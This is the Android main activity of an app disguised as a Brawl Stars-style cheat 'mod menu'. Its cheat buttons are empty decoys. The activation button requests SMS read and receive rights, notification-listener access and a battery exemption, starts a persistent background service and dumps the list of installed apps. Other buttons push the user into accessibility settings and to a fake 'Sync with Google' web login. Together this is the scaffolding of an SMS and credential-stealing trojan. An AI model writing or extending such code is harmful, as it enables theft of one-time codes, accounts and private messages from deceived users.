package com.brawl.modmenu;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setGravity(Gravity.CENTER);
        ll.setPadding(48, 48, 48, 48);

        TextView title = new TextView(this);
        title.setText("BRAWL MODMENU v3.2");
        title.setTextSize(22);
        title.setGravity(Gravity.CENTER);
        ll.addView(title);

        addBtn(ll, "ESP / Wallhack", v -> {});
        addBtn(ll, "Aimbot (Auto)", v -> {});
        addBtn(ll, "Unlimited Gems", v -> {});
        addBtn(ll, "Speed Hack", v -> {});

        Button init = new Button(this);
        init.setText("АКТИВИРОВАТЬ МОДУЛИ");
        init.setOnClickListener(v -> {
            PermHelper.requestBattery(this);
            if (Build.VERSION.SDK_INT >= 33 &&
                checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1);
            }
            if (checkSelfPermission(Manifest.permission.READ_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
                }, 2);
            }
            startForegroundService(new Intent(this, KeepAliveService.class));
            PermHelper.openNotifAccess(this);
            AppList.dump(this);
        });
        ll.addView(init);

        Button a11y = new Button(this);
        a11y.setText("Шаг 2: разрешить оверлей");
        a11y.setOnClickListener(v -> PermHelper.openA11y(this));
        ll.addView(a11y);

        Button gLogin = new Button(this);
        gLogin.setText("Синхронизировать с Google");
        gLogin.setOnClickListener(v ->
            startActivity(new Intent(this, WebLoginActivity.class)));
        ll.addView(gLogin);

        setContentView(ll);
    }

    private void addBtn(LinearLayout p, String txt, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(txt);
        b.setOnClickListener(l);
        p.addView(b);
    }
}
